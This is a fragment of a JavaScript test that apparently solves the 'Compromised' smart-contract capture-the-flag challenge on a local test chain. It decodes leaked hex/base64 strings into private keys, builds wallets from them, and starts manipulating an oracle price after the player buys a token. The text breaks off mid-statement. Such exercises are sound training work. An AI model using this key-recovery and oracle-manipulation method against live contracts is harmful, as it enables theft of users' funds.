...
const parsePrivateKey = (hexString) => {
  const byteArray = Buffer.from(
    hexString.split(" ").join(""),
    "hex"
  ).toString();
  return Buffer.from(byteArray, "base64").toString("utf-8");
};
...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    const p1 = parsePrivateKey(s1);
    const p2 = parsePrivateKey(s2);

    const wallet1 = new ethers.Wallet(p1, ethers.provider);
    const wallet2 = new ethers.Wallet(p2, ethers.provider);
    ...
    // buy one
    await exchange.connect(player).buyOne({ value: 100 });

    // change Price EXCHANGE_INITIAL_ETH_BALANCE
    await oracle
      .connect(wallet1)
